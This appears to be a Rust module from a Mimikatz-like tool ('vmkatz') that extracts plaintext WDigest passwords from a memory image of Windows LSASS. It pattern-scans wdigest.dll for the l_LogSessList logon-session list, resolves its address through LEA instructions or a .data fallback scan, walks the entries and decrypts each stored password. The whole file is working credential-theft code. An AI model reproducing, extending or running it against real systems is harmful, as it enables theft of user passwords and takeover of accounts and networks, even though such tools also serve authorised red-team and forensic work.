use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{Arch, WdigestCredential, read_ptr, read_ustring, is_valid_user_ptr, walk_list, scan_data_for_list_head};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Per-arch offsets for KIWI_WDIGEST_LIST_ENTRY.
/// Same struct layout for all Vista+ builds; only pointer sizes differ between x64/x86.
struct WdigestOffsets {
    luid: u64,
    username: u64,
    domain: u64,
    password: u64,
}

/// x64 offsets:
///   +0x00: Flink (8B), +0x08: Blink (8B), +0x10: UsageCount (8B), +0x18: This (8B)
///   +0x20: LUID (8B), +0x28: pad (8B)
///   +0x30: UserName (16B), +0x40: HostName (16B), +0x50: Password (16B)
const WDIGEST_OFFSETS_X64: WdigestOffsets = WdigestOffsets {
    luid: 0x20, username: 0x30, domain: 0x40, password: 0x50,
};

/// x86 offsets:
///   +0x00: Flink (4B), +0x04: Blink (4B), +0x08: UsageCount (4B), +0x0C: This (4B)
///   +0x10: LUID (8B), +0x18: pad (4B)
///   +0x1C: UserName (8B), +0x24: HostName (8B), +0x2C: Password (8B)
const WDIGEST_OFFSETS_X86: WdigestOffsets = WdigestOffsets {
    luid: 0x10, username: 0x1C, domain: 0x24, password: 0x2C,
};

/// Extract WDigest credentials (plaintext passwords) from wdigest.dll (unified x64/x86).
pub fn extract_wdigest_credentials_arch(
    vmem: &dyn VirtualMemory,
    wdigest_base: u64,
    _wdigest_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, WdigestCredential)>> {
    let offsets = match arch {
        Arch::X64 => &WDIGEST_OFFSETS_X64,
        Arch::X86 => &WDIGEST_OFFSETS_X86,
    };

    let pe = PeHeaders::parse_from_memory(vmem, wdigest_base)?;
    let mut results = Vec::new();

    let (pattern_list, pattern_label) = match arch {
        Arch::X64 => (patterns::WDIGEST_LOGON_SESSION_PATTERNS, "wdigest_l_LogSessList"),
        Arch::X86 => (patterns::WDIGEST_LOGON_SESSION_PATTERNS_X86, "wdigest_l_LogSessList_x86"),
    };

    // Pattern scan for l_LogSessList, fall back to .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = wdigest_base + text.virtual_address as u64;
            match patterns::find_pattern(vmem, text_base, text.virtual_size, pattern_list, pattern_label) {
                Ok((pattern_addr, _)) => {
                    let resolved = resolve_list_addr(vmem, &pe, wdigest_base, pattern_addr, arch);
                    match resolved {
                        Ok(addr) => {
                            let flink = read_ptr(vmem, addr, arch).unwrap_or(0);
                            if flink != 0 && flink != addr && is_valid_user_ptr(flink, arch) {
                                addr
                            } else {
                                log::info!("Pattern-resolved l_LogSessList at 0x{:x} has invalid flink, falling back to .data scan", addr);
                                find_wdigest_list_in_data(vmem, &pe, wdigest_base, offsets, arch)?
                            }
                        }
                        Err(_) => find_wdigest_list_in_data(vmem, &pe, wdigest_base, offsets, arch)?,
                    }
                }
                Err(e) => {
                    log::info!("Code pattern scan failed: {}", e);
                    find_wdigest_list_in_data(vmem, &pe, wdigest_base, offsets, arch)?
                }
            }
        }
        None => find_wdigest_list_in_data(vmem, &pe, wdigest_base, offsets, arch)?,
    };
    log::info!("WDigest l_LogSessList at 0x{:x} (arch={:?})", list_addr, arch);

    // Walk the list
    walk_list(vmem, list_addr, arch, |current| {
        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
        let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();

        if !username.is_empty() {
            let password = crate::lsass::crypto::decrypt_unicode_string_password_arch(
                vmem, current + offsets.password, keys, arch,
            );

            log::debug!(
                "WDigest: LUID=0x{:x} user={} domain={} pwd_len={}",
                luid, username, domain, password.len()
            );
            results.push((luid, WdigestCredential { username, domain, password }));
        }
        true
    })?;

    let with_passwords = results.iter().filter(|(_, c)| !c.password.is_empty()).count();
    log::info!("WDigest: found {} entries ({} with passwords)", results.len(), with_passwords);
    Ok(results)
}

/// Resolve the list address from a pattern match using arch-appropriate instructions.
fn resolve_list_addr(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    dll_base: u64,
    pattern_addr: u64,
    arch: Arch,
) -> Result<u64> {
    match arch {
        Arch::X64 => {
            // Search for LEA instruction near pattern
            let search_start = pattern_addr.saturating_sub(0x30);
            let data = vmem.read_virt_bytes(search_start, 0x100)?;
            for i in 0..data.len().saturating_sub(6) {
                let is_lea = (data[i] == 0x48 && data[i + 1] == 0x8D && (data[i + 2] == 0x0D || data[i + 2] == 0x15))
                    || (data[i] == 0x4C && data[i + 1] == 0x8D && (data[i + 2] == 0x05 || data[i + 2] == 0x0D));
                if is_lea {
                    return patterns::resolve_rip_relative(vmem, search_start + i as u64, 3);
                }
            }
            Err(crate::error::VmkatzError::PatternNotFound("LEA for wdigest l_LogSessList".to_string()))
        }
        Arch::X86 => {
            let ds = pe.find_section(".data").ok_or_else(|| {
                crate::error::VmkatzError::PatternNotFound(".data section in wdigest.dll".to_string())
            })?;
            let data_base = dll_base + ds.virtual_address as u64;
            let data_end = data_base + ds.virtual_size as u64;
            patterns::find_list_via_abs(vmem, pattern_addr, dll_base, data_base, data_end, "wdigest_x86")
        }
    }
}

/// Fallback: scan .data section for WDigest l_LogSessList LIST_ENTRY head (unified x64/x86).
fn find_wdigest_list_in_data(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    wdigest_base: u64,
    offsets: &WdigestOffsets,
    arch: Arch,
) -> Result<u64> {
    scan_data_for_list_head(
        vmem, pe, wdigest_base, arch, 0x10000, "wdigest.dll", 0x100000,
        false, "l_LogSessList",
        |flink, list_addr| {
            let entry_flink = match read_ptr(vmem, flink, arch) {
                Ok(f) => f,
                Err(_) => return false,
            };
            if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
                return false;
            }
            let luid = vmem.read_virt_u64(flink + offsets.luid).unwrap_or(0);
            if luid == 0 || luid > 0xFFFFFFFF {
                return false;
            }
            let username = read_ustring(vmem, flink + offsets.username, arch).unwrap_or_default();
            if username.is_empty() || username.len() > 256 {
                return false;
            }
            log::debug!(
                "Found l_LogSessList candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x} user='{}'",
                list_addr, flink, luid, username
            );
            true
        },
    )
}
